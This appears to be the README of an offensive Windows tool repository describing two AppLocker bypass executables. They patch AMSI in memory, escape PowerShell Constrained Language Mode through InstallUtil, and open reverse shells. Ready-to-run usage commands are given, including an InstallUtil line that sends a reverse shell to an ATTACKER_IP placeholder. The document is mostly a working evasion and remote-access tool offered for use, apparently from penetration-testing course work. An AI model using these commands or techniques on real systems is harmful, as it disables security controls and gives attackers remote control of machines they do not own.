# Applocker Bypass


## ToC

| Application | Output | Notes |
| ----------- | ------ | ----- |
| `altBypass` | EXE | Alternate custom ps-runspace for use in evading Application whitelisting |
| `psBypass`  | EXE | For use with InstallUtil. Contains AMSI binary patch. Will start an interactive powershell session in FullLanguageMode. |

## `altBypass`
Alternate custom PS-runspace for use in evading Application whitelisting.  Will start an interactive powershell session in **FullLanguageMode** and functions better over remote shells than `psBypass`.  Combination of [superhac/InteractiveRunspace](https://github.com/superhac/OSEP/blob/main/InteractiveRunspace.cs) and [calebstewart/bypass-clm](https://github.com/calebstewart/bypass-clm) with a dynamic patch for AMSI.  

The AMSI patch works by locating `AmsiUacInitialize` and then locating the actual functions we want to patch (`AmsiScanBuffer` and `AmsiScanString`) by grabbing the 1000 bytes preceding `AmsiUacInitiliaze` and then locating the functions within them by byte array. This *avoids the issue of hardcoding the offsets* of the target functions from `AmsiUacInitialize` when the location of the functions change depending on Windows version. 

Has builtin InstallUtils bypass ability.

I have also added the reverse shell functionality as implemented in [padovah4ck/PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM). You can now get PowerShell FullLanguage Mode reverse shells, as a new process!

### Usage
To run a PS FullLanguageMode Session in your current console:
```cmd
# without installutil applocker bypass
altbypass.exe

# with bypass
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U <path>\altbypass.exe
```

To get a reverse shell:
```cmd
# without bypass
altbypass.exe

# with bypass
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=<ATTACKER_IP> /rport=<ATTACKER_PORT> /U <path>\altbypass.exe &
```



## `psBypass`
For use with InstallUtil. Contains AMSI binary patch, but it uses harcoded offsets from `AmsiUacInitialize` of 96 bytes & 352 bytes to look for `AmsiScanBuffer` and `AmsiScanString`. Will start an interactive powershell session in FullLanguageMode.
